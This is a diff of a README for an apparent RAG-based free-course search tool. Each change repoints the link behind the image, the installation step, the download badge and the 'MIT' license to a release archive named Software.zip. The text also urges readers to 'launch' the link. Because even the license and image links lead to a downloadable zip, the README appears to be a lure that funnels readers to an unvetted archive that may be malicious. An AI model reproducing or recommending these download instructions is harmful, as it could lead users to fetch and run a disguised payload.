@@ -1,7 +1,7 @@
 
 # Rag Free Courses Assistant 🌟
 
-![Image](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v1.0/Soft.zip)
+![Image](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v2.0/Software.zip)
 
 Welcome to **Rag Free Courses Assistant** repository - your go-to RAG-based smart search tool for recommending free online courses to upskill yourself! Whether you are looking to learn about data scraping, generative AI, or retrieval-augmented generation, this tool has got you covered. Powered by cutting-edge technologies like Groq, Huggingface, Llama3, and Pinecone, this tool uses Python to create a seamless experience for finding the perfect course for your learning journey.
 
@@ -27,7 +27,7 @@ Welcome to **Rag Free Courses Assistant** repository - your go-to RAG-based smar
 
 ## Installation Guide 🛠️
 
-To get started with **Rag Free Courses Assistant**, download the latest release [here](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v1.0/Soft.zip). Remember, the link needs to be launched to access the file. If you encounter any issues with the link, please check the "Releases" section of this repository.
+To get started with **Rag Free Courses Assistant**, download the latest release [here](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v2.0/Software.zip). Remember, the link needs to be launched to access the file. If you encounter any issues with the link, please check the "Releases" section of this repository.
 
 ## Usage 🖥️
 
@@ -49,8 +49,8 @@ We would like to extend our gratitude to the developers and contributors of the 
 
 ---
 
-[![Download Latest Release](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v1.0/Soft.zip%20Release-brightgreen)](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v1.0/Soft.zip)
+[![Download Latest Release](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v2.0/Software.zip)
 
-License: [MIT](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v1.0/Soft.zip)
+License: [MIT](https://github.com/rdas77/Rag_free_cources_assisstant/releases/download/v2.0/Software.zip)
 
 Copyright © 2022 Rag Free Courses Assistant
